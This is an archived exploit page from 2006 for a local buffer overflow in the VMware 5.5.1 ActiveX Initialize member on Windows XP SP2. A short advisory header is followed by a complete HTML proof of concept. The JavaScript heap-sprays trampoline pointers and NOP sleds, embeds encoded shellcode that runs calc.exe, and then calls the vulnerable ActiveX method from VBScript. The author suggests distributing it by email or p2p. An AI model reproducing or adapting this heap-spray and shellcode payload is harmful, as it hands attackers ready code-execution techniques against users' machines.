<html><head><title>VMware 5.5.1 (ActiveX) Local Buffer Overflow Exploit</title></head><pre>/*
 *****************************************************************************************************************
  $ An open security advisory #17 - VMWare ActiveX lame local overflow
 *****************************************************************************************************************
  1: Bug Researcher: c0ntex - c0ntexb[at]gmail.com -+- www.open-security.org
  2: Bug Released: August 18th or so... 2006
  3: Bug Impact Rate: Code execution
  4: Bug Scope Rate: Local 
 *****************************************************************************************************************
  $ This advisory and/or proof of concept code must not be used for commercial gain.
 *****************************************************************************************************************


 VMWare
 http://vmware.com

 &quot;Revolutionize software development, testing and deployment in your enterprise with powerful virtual
 machine software for developers and system administrators. VMware Workstation delivers powerful
 virtual machine software for the technical professional.&quot;

 Since this is a local only for ActiveX component, it requires being emailed or distribution via some
 p2p file share network or p2p chat networks. Pretty useless :)

*/


&lt;html&gt;
&lt;head&gt;
&lt;title&gt;WinXP Pro SP2 lame local VMWare Buffer Overflow&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;center&gt;
&lt;br&gt;
Discovered and developed by c0ntex - c0ntexb@gmail.com&lt;br&gt;
Visit my website at http://www.open-security.org&lt;br&gt;
&lt;br&gt;
&lt;h3&gt;
This will exploit overflow and execute calc.exe on WinXP Pro SP2&lt;br&gt;
(fully patched) against VMWare 5.5.1 Initialize ActiveX member.&lt;br&gt;
&lt;/h3&gt;
I have only found a bad solution to this bug. Due to the fact that&lt;br&gt;
my controlling assembler is a call dword ptr[reg] I need to point&lt;br&gt;
to a location I control, fine. However my payload is random pretty&lt;br&gt;
much every run. Therefor I fill half a HUGE  buffer with the address&lt;br&gt;
(pointer) to my evil buffer, which them trampolines me to shellcode&lt;br&gt;
&lt;br&gt;
call ptr [reg]&lt;br&gt;
[reg] -&gt; 0xtrampoline&lt;br&gt;
0xtrampoline -&gt; shellcode&lt;br&gt;
&lt;br&gt;
&lt;/center&gt;
&lt;script&gt;
var buffa1 = unescape(&quot;%uedb0%u0d91&quot;) 
do {
buffa1 += buffa1;
}
while (buffa1.length &lt; 0x500000);
var buffa2 = unescape(&quot;%u9090%u9090&quot;) 
do {
buffa2 += buffa2;
}
while (buffa2.length &lt; 0x800000);
buffa1 += buffa2;
buffa1 += unescape(&quot;%u9090%u9090%u9090%uC929%uE983%uD9DB%uD9EE%u2474&quot; +
&quot;%u5BF4%u7381%uA913%u4A67%u83CC%uFCEB%uF4E2%u8F55&quot; +
&quot;%uCC0C%u67A9%u89C1%uEC95%uC936%u66D1%u47A5%u7FE6&quot; +
&quot;%u93C1%u6689%u2FA1%u2E87%uF8C1%u6622%uFDA4%uFE69&quot; +
&quot;%u48E6%u1369%u0D4D%u6A63%u0E4B%u9342%u9871%u638D&quot; +
&quot;%u2F3F%u3822%uCD6E%u0142%uC0C1%uECE2%uD015%u8CA8&quot; +
&quot;%uD0C1%u6622%u45A1%u43F5%u0F4E%uA798%u472E%u57E9&quot; +
&quot;%u0CCF%u68D1%u8CC1%uECA5%uD03A%uEC04%uC422%u6C40&quot; +
&quot;%uCC4A%uECA9%uF80A%u1BAC%uCC4A%uECA9%uF022%u56F6&quot; +
&quot;%uACBC%u8CFF%uA447%uBFD7%uBFA8%uFFC1%u46B4%u30A7&quot; + 
&quot;%u2BB5%u8941%u33B5%u0456%uA02B%u49CA%uB42F%u67CC&quot; +
&quot;%uCC4A%uD0FF&quot;);
&lt;/script&gt;
&lt;object id=&quot;target&quot; classid=&quot;clsid:F76E4799-379B-4362-BCC4-68B753D10744&quot;&gt;
&lt;/object&gt;
&lt;script language=&quot;vbscript&quot;&gt;
VmdbDb=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
VmdbPoll=200011744
target.Initialize VmdbDb, VmdbPoll
&lt;/script&gt;
&lt;/body&gt;

# milw0rm.com [2006-08-27]</pre></html>